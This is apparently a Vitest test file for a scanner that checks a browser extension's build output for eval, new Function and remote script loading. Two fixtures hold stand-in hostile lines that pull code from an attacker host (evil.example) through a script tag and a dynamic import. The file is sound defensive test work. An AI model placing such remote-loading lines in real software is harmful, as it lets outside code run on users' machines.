import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { scanDistForViolations } from "./scan-dist-for-eval.mjs";

// Exercises the scanner's matching logic against small synthetic
// directories, so it is proven correct without depending on a real
// `vite build` output existing (the actual dist/ enforcement runs as
// part of `pnpm build`; see package.json and the header comment in
// scan-dist-for-eval.mjs).

let dir: string;

beforeEach(() => {
  dir = mkdtempSync(path.join(tmpdir(), "scan-dist-test-"));
});

afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

function write(relativePath: string, content: string): void {
  writeFileSync(path.join(dir, relativePath), content);
}

describe("scanDistForViolations", () => {
  it("is clean on ordinary bundled JS and HTML", () => {
    write("popup.html", '<!doctype html><html><body><script type="module" src="./popup.js"></script></body></html>');
    write("popup.js", 'const evaluate = 1; console.log("hello");');
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("flags a literal eval( call", () => {
    write("worker.js", 'function run(s) { return eval(s); }');
    const offenses = scanDistForViolations(dir);
    expect(offenses.some((o) => o.includes("eval"))).toBe(true);
  });

  it("does not flag 'eval' as a property/identifier substring (retrieval, evaluate)", () => {
    write("worker.js", "const retrieval = 1; function evaluate() {} obj.eval2(1);");
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("flags new Function(...)", () => {
    write("worker.js", 'const f = new Function("a", "return a");');
    const offenses = scanDistForViolations(dir);
    expect(offenses.some((o) => o.includes("new Function"))).toBe(true);
  });

  it("flags a remote <script src> in an HTML file", () => {
    write("popup.html", '<script src="https://evil.example/payload.js"></script>');
    const offenses = scanDistForViolations(dir);
    expect(offenses.some((o) => o.includes("remote <script"))).toBe(true);
  });

  it("does not flag a local <script src>", () => {
    write("popup.html", '<script type="module" src="./popup.js"></script>');
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("flags a remote dynamic import(\"http...\") in JS", () => {
    write("worker.js", 'async function load() { await import("https://evil.example/mod.js"); }');
    const offenses = scanDistForViolations(dir);
    expect(offenses.some((o) => o.includes("remote import"))).toBe(true);
  });

  it("does not flag a local dynamic import", () => {
    write("worker.js", 'async function load() { await import("./chunk-abc123.js"); }');
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("ignores non-js/html files entirely (e.g. woff2, png, css)", () => {
    write("theme.css", "body { color: red; }");
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("reports file:line for each offense", () => {
    write("worker.js", "line one\nline two eval(x)\nline three");
    const offenses = scanDistForViolations(dir);
    expect(offenses[0]).toMatch(/^worker\.js:2:/);
  });
});
